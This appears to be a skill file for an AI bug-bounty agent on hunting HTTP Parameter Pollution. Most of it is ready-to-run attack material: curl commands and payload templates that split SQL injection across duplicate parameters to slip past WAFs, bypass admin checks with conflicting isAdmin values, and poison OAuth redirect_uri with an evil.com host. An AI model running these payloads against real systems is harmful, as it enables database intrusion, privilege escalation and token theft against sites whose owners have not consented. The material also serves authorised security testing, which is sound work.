---
name: hunt-http-param-pollution
description: Hunt HTTP Parameter Pollution — duplicate parameter injection, WAF bypass via parameter splitting, framework-specific parsing differences, client-side and server-side HPP. High when bypassing auth or WAF rules. Use when testing endpoints with duplicate parameter support.
sources: hackerone_public
---

# HUNT-HTTP-PARAM-POLLUTION — HTTP Parameter Pollution

## Crown Jewel Targets

HPP alone is Medium. High when it bypasses WAF rules, auth checks, or parameter validation.

- **WAF-bypass via parameter splitting** — split attack payload across duplicate params
- **Auth bypass** — admin=0&admin=1 when backend uses first/last param
- **Admin panel access** — isAdmin=false&isAdmin=true
- **SQLi/WAF bypass** — id=1&id=UNION&id=SELECT&id=1,2,3
- **OAuth redirect bypass** — redirect_uri=https://evil.com&redirect_uri=https://target.com

## Attack Surface Signals

```
Any endpoint accepting query parameters
Framework-specific behaviors:
  ASP.NET/IIS: comma-concatenation (a=1&a=2 → "1,2")
  PHP/Apache: last wins (a=1&a=2 → "2")
  JSP/Tomcat: first wins (a=1&a=2 → "1")
  Python/Zope: first wins
  Node/Express: array (a=1&a=2 → [1, 2])
```

## Step-by-Step Hunting Methodology

### Phase 1 — Identify Backend Framework

```bash
# Check Server header / cookies / response patterns
curl -s -I https://target.com/ | grep -iE "server|asp|x-powered-by|set-cookie"
```

### Phase 2 — Determine Parameter Handling

```bash
# Test with two values
curl "https://target.com/api?user=ATTACKER&user=admin"
# ASP.NET: "ATTACKER,admin"
# PHP: "admin"(last wins)
# JSP: "ATTACKER"(first wins)
```

### Phase 3 — Exploit

```bash
# SQLi via HPP (ASP.NET — comma concatenation)
curl "https://target.com/api?id=1'&id=UNION&id=SELECT&id=1,2,3--"
# WAF sees: id=1' (safe), id=UNION (safe) individually
# Backend sees: "1',UNION,SELECT,1,2,3--" → SQLi

# Auth bypass (PHP — last wins)
curl "https://target.com/admin?isAdmin=false&isAdmin=true"
# Backend sees: isAdmin=true

# WAF bypass via HPP (rate limit)
curl "https://target.com/api?action=delete&action=view"
# WAF blocks POST /api?action=delete, but allows GET
# HPP confuses WAF while backend understands intent
```

### Phase 4 — Client-Side HPP

```javascript
// Test if client-side JS merges duplicate params
// Some frameworks concatenate params in hash routing
// e.g., Angular: https://target.com/#/page?a=1&a=2
```

## Payload Templates

```
# ASP.NET SQLi via HPP
?page=1&page=UNION&page=SELECT&page=1,2,3--

# PHP auth bypass
?admin=false&admin=true

# WAF bypass
?id=1&id=OR&id=1=1--

# OAuth redirect bypass
?redirect_uri=https://evil.com&redirect_uri=https://target.com
```

## Common Root Causes

- WAFs inspect each parameter value independently, missing combined malicious intent
- Different frameworks handle duplicate params differently than WAF expects
- Parameter validation logic runs on individual values not the combined result
- OAuth providers validate the last redirect_uri but the server processes the first

## Gate 0 Validation

- [ ] Have I identified the backend framework?
- [ ] Do duplicate parameters get processed differently than expected?
- [ ] Have I bypassed any security control via HPP?
